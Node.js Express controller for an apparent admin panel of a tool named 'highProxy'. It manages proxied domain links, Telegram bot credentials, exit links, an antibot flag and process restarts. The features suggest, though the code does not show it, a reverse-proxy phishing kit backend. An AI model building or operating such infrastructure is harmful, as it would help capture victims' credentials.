const fs = require('fs')
const { exec } = require('child_process')

const { validationResult } = require('express-validator');
const superagent = require('superagent');
const { info } = require('console');

const util = require('../../lib/utils');


exports.getLinks = (req, res) => {

    const link_list = []
    const domain_list = []
    const wildcard_domains = []
    
    let redirectUrl

    let userFileObj = JSON.parse(util.betterReadFile('./highProxy/config/user.json'))
    const srcKey = userFileObj.SRC_KEY


    const sslFileObj = JSON.parse(util.betterReadFile('./highProxy/config/ssl.json'))
    sslFileObj.forEach(sslInfo =>  {
        const formattedLink = `https://${sslInfo.domain}/?${srcKey}`
        if (sslInfo.isRedirect) {
            redirectUrl = formattedLink
        } else {
            // if (sslInfo.isWildcard) {
            //     wildcard_domains.push(sslInfo.domain)

            // } else {
            //     domain_list.push(sslInfo.domain)
            //     link_list.push(formattedLink)
            // }
            domain_list.push(sslInfo.domain)
            link_list.push(formattedLink)
            
        }
        
    })

    let selectedList 
    if (redirectUrl) {
        selectedList = domain_list
    } else {
        selectedList = link_list
    }

    // let cloudflare_gen_link = userFileObj.CF_WORKER_URL || ''

    const linkObj = {
        link_domains: selectedList,
        // wildcard_domains: wildcard_domains,

        inbuit_redirect: redirectUrl,
    }

    return res.json({
        status: "Success",
        error: null,
        code: 0,
        message: `Successfully fetched all links, No: ${selectedList.length}`,
        info: linkObj,
    })

}

exports.getProcessInfo = (req, res) => {

}

exports.execProcessAction = (req, res) => {
    const vResult = validationResult(req);
    const hasErrors = !vResult.isEmpty();
    if (hasErrors) {
            return res.status(402).json(vResult.errors);
    }


    const execAction = req.body.state

    let execUrl = ''
    if (execAction === 'START') {
        execUrl = `http://localhost:${process.env.PM3_PORT}/start`
    } else if (execAction === 'STOP') {
        execUrl = `http://localhost:${process.env.PM3_PORT}/stop`
    } else if (execAction === 'RESTART') {
        execUrl = `http://localhost:${process.env.PM3_PORT}/restart`
    } else {
        return res.json({
            status: "Error",
            error: 'Invalid Action',
            code: 1,
            message: `Cannot understand the action: ${execAction} given to server...`,
        })
    }

    superagent.get(execUrl)
        .end((err, resp) => {
            if (err) {
                console.error(err)
                    return res.json({
                    status: "Error",
                    error: err,
                    code: 1,
                    message: `Failed to execute action: ${execAction} on server`,
                })
            }
                return res.json({
                status: "Success",
                error: null,
                code: 0,
                message: `Successfully executed action: ${execAction}, Please Restart highProxy to effect changes`,
                info: execAction,
            })
                    
        })

}

exports.setTelegramID = (req, res) => {
    const vResult = validationResult(req);
    const hasErrors = !vResult.isEmpty();
    if (hasErrors) {
            return res.status(402).json(vResult.errors);
    }

    const telegramID = req.body.telegramID

    const userFileObj = JSON.parse(util.betterReadFile( './highProxy/config/user.json'))

    userFileObj.TELEGRAM_USER_ID = telegramID

    util.betterWriteFile('./highProxy/config/user.json', JSON.stringify(userFileObj, '', 4))

    return res.json({
        status: "Success",
        error: null,
        code: 0,
        message: `Successfully set Telegram ID to ${telegramID}`,
        info: telegramID,
    })
}

exports.setExitLink = (req, res) => {
    const vResult = validationResult(req);
    const hasErrors = !vResult.isEmpty();
    if (hasErrors) {
            return res.status(402).json(vResult.errors);
    }

    const exitLink = req.body.exitLink

    const userFileObj = JSON.parse(util.betterReadFile( './highProxy/config/user.json'))

    userFileObj.EXIT_LINK = exitLink

    util.betterWriteFile('./highProxy/config/user.json', JSON.stringify(userFileObj, '', 4))

    return res.json({
        status: "Success",
        error: null,
        code: 0,
        message: `Successfully set Exit Link to ${exitLink}`,
        info: exitLink,
    })
}


exports.setTelegramBot = (req, res) => {
    const vResult = validationResult(req);
    const hasErrors = !vResult.isEmpty();
    if (hasErrors) {
            return res.status(402).json(vResult.errors);
    }

    const telegramID = req.body.telegramID
    const telegramBotToken = req.body.botToken

    const userFileObj = JSON.parse(util.betterReadFile('./highProxy/config/user.json'))

    userFileObj.TELEGRAM_USER_ID = telegramID
    userFileObj.TELEGRAM_BOT_TOKEN = telegramBotToken

    util.betterWriteFile('./highProxy/config/user.json', JSON.stringify(userFileObj, '', 4))

    return res.json({
        status: "Success",
        error: null,
        code: 0,
        message: `Successfully set Telegram ID to ${telegramID}`,
        info: telegramID,
    })
}


exports.getInformation = (req, res) => {
    const userFileObj = JSON.parse(util.betterReadFile( './highProxy/config/user.json'))

    const infoObj = {}

    infoObj.CURRENT_PROJECT = userFileObj.CURRENT_PROJECT
    infoObj.TELEGRAM_USER_ID = userFileObj.TELEGRAM_USER_ID
    infoObj.TELEGRAM_BOT_TOKEN = userFileObj.TELEGRAM_BOT_TOKEN
    infoObj.BOT_REDIRECT = userFileObj.BOT_REDIRECT
    infoObj.EXIT_LINK = userFileObj.EXIT_LINK

    infoObj.ANTIBOT = userFileObj.GATE_KEY ? 'ON' : 'OFF'

    // infoObj.STATE=  


    return res.json({
        status: "Success",
        error: null,
        code: 0,
        info: `${JSON.stringify(infoObj, '', 4)}`,
        message: 'SErver Status Fetched Sucessfully',
    })
}

exports.rebootInstance = (req, res) => {
    const bashExec = exec('bash scripts/reboot-highProxy.sh', function(err, stdout, stderr) {
        if (err) {
            console.error("Early Failure for Reboot work...")
            return res.json({
				status: "Error",
				error: "Failed To Reboot and Update the highProxy Instance ",
				code: code,
				needRestart: false,
				message: 'Failed To Reboot and Update the highProxy Instance, Check if your vps is active, or try doing from terminal with command "npm run restart"'
			})
        }
      });

    res.json({
        status: "Success",
        error: null,
        code: 0,
        message: 'Successfully rebooted and updated the instance.\n\nPlease Wait 2min before Issuing another command',
        info: 'Successfully rebooted and updated the instance.\n\nPlease Wait 2min before Issuing another command',
    })

    process.exit(0)
}


exports.setProxyUrl = (req, res) => {
    const vResult = validationResult(req);
    const hasErrors = !vResult.isEmpty();
    if (hasErrors) {
            return res.status(402).json(vResult.errors);
    }

    const proxyUrl = req.body.proxyUrl
    const noProxy = req.body.noProxy || ''
    const enableProxy = req.body.proxy || false


    const userFileObj = JSON.parse(util.betterReadFile( './highProxy/config/user.json'))

    userFileObj.GLOBAL_AGENT_HTTP_PROXY = proxyUrl
    userFileObj.GLOBAL_AGENT_NO_PROXY = noProxy
    userFileObj.ENABLE_PROXY = enableProxy


    util.betterWriteFile('./highProxy/config/user.json', JSON.stringify(userFileObj, '', 4))

    return res.json({
        status: "Success",
        error: null,
        code: 0,
        message: `Successfully set proxy to ${proxyUrl}`,
        info: proxyUrl,
    })
}